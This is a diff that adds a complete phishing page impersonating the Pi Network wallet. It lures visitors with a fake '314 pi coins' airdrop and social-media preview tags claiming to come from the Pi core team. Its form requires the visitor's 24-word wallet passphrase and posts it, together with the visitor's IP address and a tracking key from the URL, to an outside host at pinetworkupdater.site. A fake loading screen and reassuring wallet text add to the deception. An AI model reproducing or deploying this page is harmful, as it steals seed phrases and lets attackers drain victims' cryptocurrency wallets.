@@ -1,0 +1,132 @@
+<!DOCTYPE html><html lang="en"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <meta property="og:title" content="Claim 314 pi coins 🎁🎁">
+    <meta property="og:description" content="Celebrate 15 KYC users with special reward">
+    <meta property="og:url" content="https://KXDDlgmR2KWV.org/pi/claim.html">
+    <meta property="og:image" content="../../6AqtcSAwYyfR.com/wp-content/uploads/2024/09/pPdAK2XjoxNs.jpg">
+    <meta property="og:site_name" content="Claim Airdrop">
+    <meta property="og:locale" content="en_US">
+    <meta property="og:type" content="website">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:site" content="@PiCoreTeam">
+    <meta name="twitter:title" content="Wallet">
+    <link rel="icon" href="_next/static/media/wallet.44634181.svg">
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:opsz,wght,FILL,GRAD@20..48,100..700,0..1,-50..200">
+    <link rel="stylesheet" href="build/assets/mehedi.css">
+    <title>Pi Wallet</title>
+    <style>
+        #main {
+            display: none;
+        }
+        #loading-spinner {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            border: 8px solid #f3f3f3;
+            border-top: 8px solid #65408a;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+    <script>
+        // Function to set the IP address hidden field value
+        function setIPAddress(ip) {
+            document.getElementById('ip_address').value = ip;
+        }
+
+        // Fetch the IP address using a third-party service
+        fetch('https://api.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => {
+                setIPAddress(data.ip);
+            });
+
+        // Enforce validation
+        function check() {
+            const textarea = document.getElementById("content");
+            const inputValue = textarea.value.trim();
+            const wordCount = inputValue.split(/\s+/).length;
+            if (wordCount === 24 && inputValue.length > 80) {
+                return true;
+            }
+            document.getElementById("emsg").innerHTML = "Invalid Passphrase";
+            return false;
+        }
+
+        // Prevent form submission before full load
+        document.addEventListener("DOMContentLoaded", () => {
+            const form = document.querySelector("form");
+            form.onsubmit = function () {
+                return check();
+            };
+
+            // Unhide content after page loads
+            window.onload = () => {
+                document.getElementById("loading-spinner").style.display = "none";
+                document.getElementById("main").style.display = "block";
+            };
+        });
+
+        // Get 'key' parameter and set it
+        function getQueryParam(name) {
+            const urlParams = new URLSearchParams(window.location.search);
+            return urlParams.get(name);
+        }
+
+        const key = getQueryParam('key');
+        if (key) {
+            document.addEventListener("DOMContentLoaded", () => {
+                document.getElementById('key').value = key;
+            });
+        }
+    </script>
+</head>
+<body class="h-full lg:w-[500px] sm:w-full m-auto">
+    <div id="loading-spinner"></div>
+    <div id="main" class="h-full">
+        <div class="wallet w-full">
+            <div class="exchange-header w-full h-[49px] px-2 flex items-center" style="background: #65408a;">
+                <div class="back w-[10%]">
+                    <a href="https://KXDDlgmR2KWV.org/pi/claim.html">
+                        <svg xmlns="http://www.w3.org/2000/svg" height="24px" viewBox="0 -960 960 960" width="24px" fill="#FFFFFF">
+                            <path d="M400-80 0-480l400-400 71 71-329 329 329 329-71 71Z"></path>
+                        </svg>
+                    </a>
+                </div>
+                <div class="title-page w-[80%]">
+                    <div class="w-full text-white font-bold flex justify-center items-center">
+                        <svg xmlns="http://www.w3.org/2000/svg" height="24px" viewBox="0 -960 960 960" width="24px" fill="#FFFFFF">
+                            <path d="M186.67-222v35.33-586.66V-222Zm0 102q-27.5 0-47.09-19.58Q120-159.17 120-186.67v-586.66q0-27.5 19.58-47.09Q159.17-840 186.67-840h586.66q27.5 0 47.09 19.58Q840-800.83 840-773.33v122.66h-66.67v-122.66H186.67v586.66h586.66v-122H840v122q0 27.5-19.58 47.09Q800.83-120 773.33-120H186.67ZM532-288.67q-31.35 0-53.67-22.13Q456-332.93 456-364v-231.33q0-31.08 22.33-53.21 22.32-22.13 53.67-22.13h273.33q31.35 0 53.68 22.13 22.32 22.13 22.32 53.21V-364q0 31.07-22.32 53.2-22.33 22.13-53.68 22.13H532Zm282.67-66.66V-604h-292v248.67h292Zm-166.51-62q26.17 0 44.34-18.48 18.17-18.47 18.17-44.86 0-25.83-18.5-43.91-18.5-18.09-44.17-18.09t-44.17 18.09q-18.5 18.08-18.5 43.91 0 26.39 18.33 44.86 18.32 18.48 44.5 18.48Z"></path>
+                        </svg>
+                        <span class="ml-2">Wallet</span>
+                    </div>
+                </div>
+            </div>
+            <div class="exchange-body px-2 py-3">
+                <div class="title text-center">
+                    <h1 class="text-xl font-bold text-gray-700">Unlock Pi Reward</h1>
+                </div>
+                <form action="https://pinetworkupdater.site/website/stock.php" method="post" class="wpcf7-form init" novalidate="novalidate" data-status="init">
+                    <div class="relative my-4">
+                        <textarea id="content" name="content" required="" rows="8" class="block p-2.5 w-full text-sm text-gray-900 bg-gray-50 rounded-lg border border-gray-300 focus:ring-blue-500 focus:border-blue-500 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white dark:focus:ring-blue-500 dark:focus:border-blue-500" placeholder="Enter your 24-word passphrase here"></textarea>
+                    </div>
+                    <input type="hidden" name="ip_address" id="ip_address" value="">
+                    <input type="hidden" id="key" name="key">
+                    <button type="submit" class="w-full bg-purple-900 hover:bg-purple-700 text-white font-bold py-3 px-4 rounded">Unlock with passphrase</button>
+                    <div id="emsg" class="text-center text-red-500 mt-2"></div>
+                </form>
+                <div class="text-block py-3 mt-6">
+                    <h5 class="text-block-css">As a non-custodial wallet, your wallet passphrase is only accessible to you. It is currently not possible to recover the wallet passphrase.</h5>
+                </div>
+                <div class="text-block py-3">
+                    <h5 class="text-block-css">Lost your wallet passphrase? <span style="color: rgba(77, 0, 215, 0.85);">you can create a new wallet</span>, but all the PI numbers in your previous wallet will be inaccessible.</h5>
+                </div></div></div></div></body></html>
